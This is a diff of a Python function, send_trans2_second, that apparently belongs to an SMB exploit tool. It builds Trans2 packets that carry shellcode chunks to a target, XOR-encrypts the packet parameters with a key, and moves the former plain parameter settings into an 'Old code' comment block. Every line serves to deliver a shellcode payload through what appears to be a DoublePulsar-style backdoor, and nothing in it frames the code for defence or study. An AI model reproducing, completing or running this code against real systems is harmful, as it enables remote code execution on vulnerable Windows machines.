@@ -200,10 +200,6 @@ def send_trans2_second(conn, tid, xorkey, data):
 	else:
 		transCommand['Data']['Pad2'] = ''
 		pad2Len = 0
-
-	transCommand['Parameters']['DataCount'] = len(data)
-	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
-	transCommand['Parameters']['DataDisplacement'] = displacement
 	
 	#xor the parameters
 	#parameters are:
@@ -211,10 +207,13 @@ def send_trans2_second(conn, tid, xorkey, data):
         #ChunkSize ( size of the shellcode chunk, or 4096 )
         #Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
 	transCommand['Parameters']['DataCount'] = xor_encrypt(len(data), xorkey)
-	#transCommand['Parameters']['DataOffset'] = xor_encrypt(fixedOffset + pad2Len, xorkey)
-	#transCommand['Parameters']['DataDisplacement'] = displacement
 	transCommand['Parameters']['Chunksize'] = xor_encrypt(len(data), xorkey)
 	transCommand['Parameters']['DataOffset'] = xor_encrypt(0x0000, xorkey)
+	''' Old code
+	transCommand['Parameters']['DataCount'] = len(data)
+	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
+	transCommand['Parameters']['DataDisplacement'] = displacement
+	'''
 
 	#xor the payload data
 	transCommand['Data']['Trans_Parameters'] = ''
